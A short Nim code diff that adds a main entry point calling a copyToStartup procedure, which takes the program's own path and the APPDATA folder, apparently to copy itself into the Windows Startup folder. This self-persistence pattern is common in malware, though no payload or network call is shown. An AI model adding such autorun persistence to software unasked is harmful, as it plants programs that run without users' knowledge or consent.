@@ -1,5 +1,5 @@
-import std/[os, osproc]
-import process
+import std/[os, osproc, strutils]
+
 proc copyToStartup() =
   let originBinary = getAppFilename()
   let roamingPath = getEnv("APPDATA")
@@ -13,3 +13,6 @@ proc copyToStartup() =
   except OSError as e:
     echo "error 107: ", e.msg
 #I admit this method is a bit daft, but it’ll do for now 
+when isMainModule:
+  copyToStartup()
+  
